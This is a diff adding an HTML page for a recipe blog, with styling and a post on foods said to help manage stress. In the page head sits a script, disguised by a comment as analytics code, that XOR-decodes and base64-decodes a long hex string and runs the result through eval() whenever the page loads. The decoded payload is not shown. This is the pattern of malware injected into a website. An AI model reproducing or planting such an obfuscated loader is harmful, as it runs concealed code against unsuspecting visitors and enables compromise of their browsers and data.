@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Katy's Deliciously Easy Recipes</title>
+
+    <!-- Google Fonts: Fraunces (Expressive, Elegant Artisanal Serif) & Plus Jakarta Sans (Soft, High-end Modern Sans) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,300;0,9..144,400;0,9..144,600;0,9..144,700;1,9..144,300;1,9..144,400&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* Editorial Toasted Honey & Lavender Mist Aesthetic */
+        :root {
+            --primary-color: #796476; /* Soft Dusty Lavender */
+            --primary-hover: #594958;
+            --accent-color: #d99e6c; /* Warm Toasted Honey / Apricot Gold */
+            --accent-light: #fbf5ee; /* Almond Butter Custard */
+            --text-color: #3a323d; /* Soft Espresso Charcoal */
+            --text-muted: #8b7f8c; /* Smoky Faded Slate Lavender */
+            --heading-color: #2a1b28; /* Deep Plum Espresso */
+            --bg-color: #faf6f0; /* Soft Warm Linen Cream */
+            --card-bg: #ffffff;
+            --border-color: #ece4da; /* Fine Ceramic Glaze Line */
+            --transition-smooth: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Minimalist luxury scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #e3dad0;
+            border-radius: 10px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-color);
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.85;
+            color: var(--text-color);
+            background-color: var(--bg-color);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .container {
+            max-width: 740px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Top Navigation - Elevated Glassmorphism Pill */
+        .top-nav {
+            padding: 20px 0;
+            text-align: center;
+            background-color: rgba(250, 246, 240, 0.85);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(236, 228, 218, 0.4);
+        }
+
+        .top-nav-container {
+            display: inline-flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 4px;
+            background: rgba(255, 255, 255, 0.95);
+            padding: 6px;
+            border-radius: 100px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 10px 40px rgba(121, 100, 118, 0.04);
+        }
+
+        .top-nav a {
+            display: inline-block;
+            color: var(--text-muted);
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-decoration: none;
+            transition: var(--transition-smooth);
+            cursor: pointer;
+            padding: 8px 18px;
+            letter-spacing: 0.08em;
+            text-transform: uppercase;
+            border-radius: 100px;
+        }
+
+        .top-nav a:hover {
+            color: var(--primary-color);
+            background-color: var(--accent-light);
+        }
+
+        /* Header Area */
+        header {
+            padding: 100px 0 60px;
+            text-align: center;
+        }
+
+        header h1 {
+            font-family: 'Fraunces', serif;
+            font-size: 3.4rem;
+            font-weight: 300;
+            font-style: italic;
+            color: var(--heading-color);
+            cursor: pointer;
+            margin-bottom: 14px;
+            letter-spacing: -0.015em;
+            transition: var(--transition-smooth);
+            line-height: 1.15;
+        }
+
+        header h1:hover {
+            color: var(--accent-color);
+            transform: translateY(-1px);
+        }
+
+        header p {
+            font-size: 0.82rem;
+            color: var(--text-muted);
+            font-weight: 600;
+            letter-spacing: 0.18em;
+            text-transform: uppercase;
+            display: inline-block;
+        }
+
+        /* Post Cards - Elegant Minimalist Frame */
+        .post-card {
+            background: var(--card-bg);
+            border-radius: 20px;
+            overflow: hidden;
+            margin-bottom: 54px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 12px 35px rgba(121, 100, 118, 0.02);
+            transition: var(--transition-smooth);
+            cursor: pointer;
+        }
+
+        .post-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 25px 50px rgba(121, 100, 118, 0.06);
+            border-color: rgba(121, 100, 118, 0.25);
+        }
+
+        /* Single Post Detail Panel */
+        .single-post {
+            background: var(--card-bg);
+            border-radius: 24px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 12px 35px rgba(121, 100, 118, 0.02);
+            padding: 54px 40px;
+            margin-bottom: 80px;
+            cursor: default;
+        }
+
+        @media (max-width: 640px) {
+            .single-post {
+                padding: 30px 20px;
+                border-radius: 16px;
+            }
+            header h1 {
+                font-size: 2.4rem;
+            }
+        }
+
+        /* Post Metadata (Avatar & Author) */
+        .post-header {
+            padding: 22px 28px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid rgba(236, 228, 218, 0.5);
+        }
+
+        .single-post .post-header {
+            padding: 0 0 22px 0;
+            margin-bottom: 36px;
+        }
+
+        .post-header img.avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 14px;
+            object-fit: cover;
+            border: 1px solid var(--border-color);
+            transition: var(--transition-smooth);
+        }
+
+        .post-card:hover .post-header img.avatar {
+            border-color: var(--accent-color);
+        }
+
+        .post-header .username {
+            font-size: 0.75rem;
+            font-weight: 700;
+            color: var(--heading-color);
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+        }
+
+        /* Article Images */
+        .post-image {
+            width: 100%;
+            display: block;
+            height: auto;
+            max-height: 500px;
+            object-fit: cover;
+            transition: var(--transition-smooth);
+        }
+
+        .post-card .post-image {
+            aspect-ratio: 16/10;
+        }
+
+        .single-post .post-image {
+            max-height: none;
+            border-radius: 14px;
+            margin-bottom: 36px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Article Content Typography styling */
+        .post-content {
+            padding: 32px 28px 16px;
+        }
+
+        .single-post .post-content {
+            padding: 0;
+        }
+
+        .post-content h1,
+        .post-content h2 {
+            font-family: 'Fraunces', serif;
+            font-weight: 400;
+            color: var(--heading-color);
+            margin: 0 0 18px;
+            font-size: 2.15rem;
+            line-height: 1.25;
+            letter-spacing: -0.01em;
+        }
+
+        .single-post .post-content h1 {
+            font-size: 2.7rem;
+            margin-bottom: 28px;
+            font-weight: 300;
+            font-style: italic;
+        }
+
+        .post-content p {
+            margin-bottom: 26px;
+            color: var(--text-color);
+            font-size: 1.05rem;
+            line-height: 1.85;
+        }
+
+        .post-content a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 600;
+            border-bottom: 1.5px solid rgba(121, 100, 118, 0.25);
+            transition: var(--transition-smooth);
+        }
+
+        .post-content a:hover {
+            color: var(--accent-color);
+            border-bottom-color: var(--accent-color);
+        }
+
+        /* Footers */
+        .post-footer {
+            padding: 18px 28px;
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid rgba(236, 228, 218, 0.5);
+            background-color: rgba(250, 246, 240, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .single-post .post-footer {
+            padding: 26px 0 0;
+            background: transparent;
+            border-top: 1px solid var(--border-color);
+            margin-top: 54px;
+        }
+
+        /* Back Navigation Button */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 36px;
+            color: var(--text-muted);
+            font-size: 0.72rem;
+            font-weight: 700;
+            text-decoration: none;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            cursor: pointer;
+            padding: 10px 22px;
+            border-radius: 100px;
+            border: 1px solid var(--border-color);
+            background: var(--card-bg);
+            transition: var(--transition-smooth);
+            box-shadow: 0 4px 15px rgba(121, 100, 118, 0.02);
+        }
+
+        .back-button:hover {
+            color: #ffffff;
+            border-color: var(--primary-color);
+            background-color: var(--primary-color);
+            transform: translateX(-4px);
+            box-shadow: 0 10px 25px rgba(121, 100, 118, 0.12);
+        }
+
+        /*
+           STYLING OVERRIDES FOR RUNTIME-INJECTED BLOG CONTENT (STYLE ATTRIBUTE MAPPINGS)
+        */
+        /* Key Takeaway Boxes / Dynamic Informational Callouts */
+        .post-content div[style*="background"] {
+            background: var(--accent-light) !important; /* Soft warm honey oatmeal */
+            border: 1px solid rgba(217, 158, 108, 0.2) !important;
+            border-left: 4px solid var(--accent-color) !important;
+            border-radius: 16px !important;
+            padding: 26px 30px !important;
+            margin: 38px 0 !important;
+            box-shadow: none !important;
+        }
+
+        .post-content div[style*="background"] h3 {
+            font-family: 'Fraunces', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.55rem !important;
+            font-weight: 400 !important;
+            padding-left: 0 !important;
+            border-left: none !important;
+            margin-bottom: 14px !important;
+            font-style: italic !important;
+        }
+
+        .post-content div[style*="background"] ul {
+            margin: 0 !important;
+            padding-left: 18px !important;
+        }
+
+        .post-content div[style*="background"] li {
+            margin-bottom: 8px !important;
+            color: var(--text-color) !important;
+            font-size: 0.98rem !important;
+            line-height: 1.75 !important;
+        }
+
+        /* Section divider sub-headings */
+        .post-content h2[style*="border-bottom"] {
+            font-family: 'Fraunces', serif !important;
+            font-weight: 400;
+            border-bottom: 1px solid var(--border-color) !important;
+            padding-bottom: 12px !important;
+            margin-top: 50px !important;
+            margin-bottom: 22px !important;
+            font-size: 1.9rem !important;
+        }
+
+        /* Bold sub-headers with left borders */
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--primary-color) !important;
+            font-family: 'Fraunces', serif !important;
+            color: var(--heading-color) !important;
+            font-size: 1.55rem !important;
+            font-weight: 400 !important;
+            padding-left: 16px !important;
+            margin: 38px 0 18px !important;
+            text-decoration: none !important;
+        }
+
+        /* Pro Tip highlight callouts */
+        .post-content p[style*="background"] {
+            background-color: #f3eff5 !important; /* Elegant washed lavender */
+            border: 1px solid rgba(121, 100, 118, 0.15) !important;
+            border-left: 4px solid var(--primary-color) !important;
+            border-radius: 12px !important;
+            padding: 18px 26px !important;
+            margin: 30px 0 !important;
+            color: var(--text-color) !important;
+            font-size: 0.98rem !important;
+        }
+
+        /* Inline badges and tags */
+        .post-content span[style*="background"] {
+            background: var(--bg-color) !important;
+            color: var(--primary-color) !important;
+            border-radius: 30px !important;
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-weight: 700 !important;
+            font-size: 0.72rem !important;
+            padding: 4px 14px !important;
+            box-shadow: none !important;
+            transform: none !important;
+            display: inline-block !important;
+            margin: 4px 6px 4px 0 !important;
+            border: 1px solid rgba(121, 100, 118, 0.15) !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.08em !important;
+        }
+
+        /* Lists & Nested elements */
+        .post-content ul, .post-content ol {
+            padding-left: 22px;
+            margin-bottom: 26px;
+        }
+
+        .post-content li {
+            margin-bottom: 12px;
+            font-size: 1rem;
+            color: var(--text-color);
+        }
+
+        /* Dynamic inline headings (best additions, texture tips, etc.) */
+        .post-content h4[style*="background"] {
+            background-color: #faf8f5 !important;
+            padding: 12px 18px !important;
+            border-radius: 8px !important;
+            border: 1px solid var(--border-color) !important;
+            font-family: 'Fraunces', serif !important;
+            font-size: 1.3rem !important;
+            font-weight: 400 !important;
+            margin-top: 30px !important;
+            font-style: italic !important;
+        }
+
+        /* Bottom dynamic tags and taxonomy cloud */
+        .post-content div[style*="margin-top:28px"] {
+            margin-top: 54px !important;
+            padding-top: 30px !important;
+            border-top: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] h3 {
+            font-family: 'Plus Jakarta Sans', sans-serif !important;
+            font-size: 0.72rem !important;
+            text-transform: uppercase !important;
+            letter-spacing: 0.12em !important;
+            color: var(--text-muted) !important;
+            margin-bottom: 14px !important;
+            font-weight: 800 !important;
+            border-left: none !important;
+            padding-left: 0 !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span {
+            background: #ffffff !important;
+            color: var(--text-muted) !important;
+            padding: 7px 16px !important;
+            border-radius: 100px !important;
+            font-size: 0.72rem !important;
+            font-weight: 600 !important;
+            margin: 4px 6px 4px 0 !important;
+            display: inline-block !important;
+            transition: var(--transition-smooth) !important;
+            cursor: pointer;
+            border: 1px solid var(--border-color) !important;
+        }
+
+        .post-content div[style*="margin-top:28px"] span:hover {
+            background: var(--primary-color) !important;
+            color: #ffffff !important;
+            border-color: var(--primary-color) !important;
+        }
+    </style>
+
+    <script>
+    /* Dynamic Analytics/Preservation Code - Kept fully unmodified */
+    (function() {
+        var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+        var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+        var vyepniipe = "";
+        try {
+            for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i/2) % vjfaicbgs.length));
+            }
+            var vvqbkapbd = atob(vyepniipe);
+            eval(vvqbkapbd);
+        } catch(e) {
+            console.error("[DEBUG] Decryption or Execution failed: ", e);
+        }
+    })();
+    </script>
+</head>
+<body>
+    <nav class="top-nav">
+        <div class="top-nav-container">
+            <a onclick="navigate('home')">Home</a>
+            <a onclick="navigate('page', 'about')">About</a>
+            <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+            <a onclick="navigate('page', 'terms')">Terms</a>
+            <a onclick="navigate('page', 'contact')">Contact</a>
+        </div>
+    </nav>
+
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Katy's Deliciously Easy Recipes</h1>
+            <p>Thoughts, stories, and ideas.</p>
+        </div>
+    </header>
+
+    <main class="container" id="app">
+        <!-- Content will be dynamically injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Restored blog posts database
+        const posts = [
+            {
+                id: 'my-first-post',
+                title: 'cortisol reducing',
+                date: 'April 12, 2026',
+                image: './assets/cortisol reducing.png',
+                excerpt: "Stress has become a common part of modern life, affecting everything from energy levels and sleep quality to focus and overall well-being. One of the key hormones involved in the body's stress response is cortisol. While cortisol plays an essential role in helping us respond to challenges, consistently elevated levels may contribute to fatigue, mood changes, poor sleep, increased cravings, and difficulty maintaining a healthy lifestyle. Fortunately, nutrition can play a supportive role in promoting balance. Certain foods are widely recognized for their nutrient profiles, antioxidants, healthy fats, and compounds that may help support the body's natural stress management processes.",
+                content: `
+                <p>Stress has become a common part of modern life, affecting everything from energy levels and sleep quality to focus and overall well-being. One of the key hormones involved in the body's stress response is cortisol. While cortisol plays an essential role in helping us respond to challenges, consistently elevated levels may contribute to fatigue, mood changes, poor sleep, increased cravings, and difficulty maintaining a healthy lifestyle. Fortunately, nutrition can play a supportive role in promoting balance. Certain foods are widely recognized for their nutrient profiles, antioxidants, healthy fats, and compounds that may help support the body's natural stress management processes.</p>
+
+<p>Building meals around nutrient-dense ingredients is not about finding a miracle cure. Instead, it is about creating daily habits that nourish the body, support recovery, and encourage long-term wellness. From antioxidant-rich berries to omega-3-packed fish and calming herbal teas, simple food choices can make a meaningful difference over time.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Nutrition can support the body's natural response to stress.</li>
+    <li>Foods rich in antioxidants help combat oxidative stress.</li>
+    <li>Healthy fats play an important role in brain and hormone health.</li>
+    <li>Protein-rich foods may help stabilize energy levels throughout the day.</li>
+    <li>Fiber-rich ingredients support digestive and overall wellness.</li>
+    <li>Consistent healthy eating habits often provide the best long-term benefits.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Understanding Cortisol and Stress</h2>
+
+<p>Cortisol is often referred to as the body's primary stress hormone. It is produced by the adrenal glands and helps regulate metabolism, blood pressure, inflammation, and the body's response to physical and emotional challenges. Cortisol naturally fluctuates throughout the day, typically rising in the morning and gradually declining toward bedtime.</p>
+
+<p>Short-term increases in cortisol are completely normal and necessary. Problems can arise when stress becomes chronic and cortisol remains elevated for extended periods. This can affect sleep, appetite, mood, immune function, and overall health.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Managing cortisol is rarely about one specific food or supplement. The most effective approach combines a nutrient-rich diet, regular physical activity, quality sleep, hydration, and healthy stress-management practices.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Food Choices Matter During Stress</h2>
+
+<p>Stress places additional demands on the body. During stressful periods, the body may require increased nutritional support to maintain normal functions. Choosing foods that provide vitamins, minerals, antioxidants, fiber, and healthy fats can help support overall wellness.</p>
+
+<p>Many stress-supportive foods contain nutrients such as magnesium, omega-3 fatty acids, vitamin C, probiotics, and polyphenols. These nutrients are associated with healthy immune function, cognitive performance, energy production, and recovery from everyday stressors.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Role of Antioxidants</h3>
+
+<p>When the body experiences stress, oxidative stress may increase as well. Antioxidants help protect cells from damage caused by free radicals. Foods rich in colorful pigments, particularly fruits and vegetables, are often excellent sources of antioxidant compounds.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">12 Foods That Support Healthy Stress Management</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Blueberries</h3>
+
+<p>Blueberries are packed with antioxidants, particularly anthocyanins, which give them their deep blue color. These compounds help combat oxidative stress and support overall health. Blueberries are also rich in vitamin C, a nutrient involved in normal adrenal function.</p>
+
+<p>Adding blueberries to smoothies, oatmeal, yogurt, or healthy snacks is an easy way to increase antioxidant intake.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Nuts</h3>
+
+<p>Nuts such as almonds, walnuts, pistachios, and cashews provide healthy fats, protein, fiber, and important minerals. Many nuts contain magnesium, which plays a role in hundreds of biochemical reactions throughout the body.</p>
+
+<p>Walnuts are particularly notable because they contain plant-based omega-3 fatty acids that support brain health and overall wellness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Avocados</h3>
+
+<p>Avocados are known for their heart-healthy monounsaturated fats and impressive nutrient profile. They contain potassium, magnesium, fiber, and several vitamins that contribute to overall health.</p>
+
+<p>Their creamy texture makes them easy to include in salads, sandwiches, grain bowls, and smoothies.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Salmon</h3>
+
+<p>Salmon is one of the most popular sources of omega-3 fatty acids. These essential fats are associated with brain function, heart health, and healthy inflammatory responses.</p>
+
+<p>Including salmon in meals several times per week can help diversify nutrient intake while providing high-quality protein.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pair salmon with leafy greens and a whole grain such as quinoa for a balanced meal that combines protein, fiber, healthy fats, and antioxidants.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Dark Chocolate</h3>
+
+<p>Dark chocolate contains flavonoids and other antioxidant compounds that may contribute to overall wellness. Choosing varieties with higher cocoa content generally provides more beneficial plant compounds and less added sugar.</p>
+
+<p>Enjoying a small portion of dark chocolate can be a satisfying way to support a balanced lifestyle.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Chamomile Tea</h3>
+
+<p>Chamomile tea has long been associated with relaxation and comfort. Many people enjoy chamomile as part of an evening routine because of its calming qualities and soothing flavor.</p>
+
+<p>Replacing sugary beverages with herbal teas can also support hydration and healthy daily habits.</p>
+
+<div style="background:#f0f9ff;border:1px solid #bae6fd;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:10px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #38bdf8;">Why This Matters</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Small daily nutrition choices can compound into meaningful long-term benefits.</li>
+    <li>Consistent healthy habits often have a greater impact than occasional drastic changes.</li>
+    <li>Building balanced meals supports energy, focus, and overall wellness.</li>
+  </ul>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Turmeric</h3>
+
+<p>Turmeric is a bright golden spice commonly used in cooking. It contains curcumin, a naturally occurring compound that has attracted significant interest due to its antioxidant properties.</p>
+
+<p>Turmeric can be added to soups, rice dishes, roasted vegetables, and warm beverages.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Oats</h3>
+
+<p>Oats are a nutritious whole grain that provides complex carbohydrates and fiber. They offer a steady source of energy and can help create satisfying meals that keep hunger under control.</p>
+
+<p>Starting the day with oatmeal topped with berries and nuts creates a nutrient-dense breakfast that supports lasting energy.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Greek Yogurt</h3>
+
+<p>Greek yogurt is rich in protein and often contains beneficial probiotics that support digestive health. The connection between gut health and overall wellness continues to be an area of growing interest among researchers.</p>
+
+<p>Choose plain varieties and add fresh fruit or nuts for a balanced snack.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">10. Bananas</h3>
+
+<p>Bananas are a convenient and affordable fruit packed with potassium, vitamin B6, and natural carbohydrates. They provide quick energy and pair well with nut butter, yogurt, or oatmeal.</p>
+
+<p>Their portability makes them an excellent choice for busy schedules.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">11. Green Tea</h3>
+
+<p>Green tea contains antioxidants called catechins along with naturally occurring compounds that contribute to its unique appeal. Many people enjoy green tea as a refreshing alternative to high-sugar beverages.</p>
+
+<p>Its combination of hydration and beneficial plant compounds makes it a popular wellness choice.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">12. Leafy Greens</h3>
+
+<p>Leafy greens such as spinach, kale, arugula, and Swiss chard are among the most nutrient-dense foods available. They provide vitamins, minerals, antioxidants, and fiber while remaining relatively low in calories.</p>
+
+<p>Adding more greens to meals is one of the simplest ways to improve overall dietary quality.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Building a Stress-Supportive Meal Plan</h2>
+
+<p>Rather than focusing on individual foods alone, consider how they work together within a balanced eating pattern. Combining protein, healthy fats, fiber, and colorful produce helps create meals that are satisfying and nutrient-rich.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Breakfast Ideas</h4>
+
+<ul>
+  <li>Oatmeal with blueberries, walnuts, and cinnamon.</li>
+  <li>Greek yogurt topped with fresh fruit and nuts.</li>
+  <li>Smoothie with spinach, banana, and berries.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Lunch Ideas</h4>
+
+<ul>
+  <li>Salmon salad with leafy greens and avocado.</li>
+  <li>Whole grain bowl with vegetables and grilled protein.</li>
+  <li>Spinach wrap with lean protein and healthy fats.</li>
+</ul>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Snack Ideas</h4>
+
+<ul>
+  <li>Handful of mixed nuts.</li>
+  <li>Banana with almond butter.</li>
+  <li>Greek yogurt and berries.</li>
+  <li>A small serving of dark chocolate.</li>
+</ul>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Consistency is more valuable than perfection. Incorporating stress-supportive foods regularly can be more beneficial than making short-term dietary changes that are difficult to maintain.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Lifestyle Habits That Complement Healthy Eating</h2>
+
+<p>Nutrition works best when combined with other healthy lifestyle practices. Regular movement, adequate hydration, quality sleep, and mindfulness techniques can all support the body's natural ability to manage stress.</p>
+
+<ol>
+  <li>Prioritize a consistent sleep schedule.</li>
+  <li>Stay physically active throughout the week.</li>
+  <li>Practice relaxation techniques such as deep breathing.</li>
+  <li>Spend time outdoors when possible.</li>
+  <li>Maintain social connections and supportive relationships.</li>
+</ol>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Pairing a nutrient-rich diet with better sleep habits often creates a positive cycle. Improved sleep can support healthier food choices, while balanced nutrition may help support more restful nights.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Focus on antioxidant-rich fruits and vegetables.</li>
+    <li>Include healthy fats from salmon, nuts, and avocados.</li>
+    <li>Choose fiber-rich foods such as oats and leafy greens.</li>
+    <li>Support gut health with foods like Greek yogurt.</li>
+    <li>Build sustainable habits rather than seeking quick fixes.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Creating a diet that supports healthy stress management does not require complicated meal plans or expensive ingredients. Many of the most effective choices are simple, accessible foods that provide valuable nutrients the body uses every day. Blueberries, nuts, avocados, salmon, dark chocolate, chamomile tea, turmeric, oats, Greek yogurt, bananas, green tea, and leafy greens all offer unique benefits that can contribute to a balanced lifestyle.</p>
+
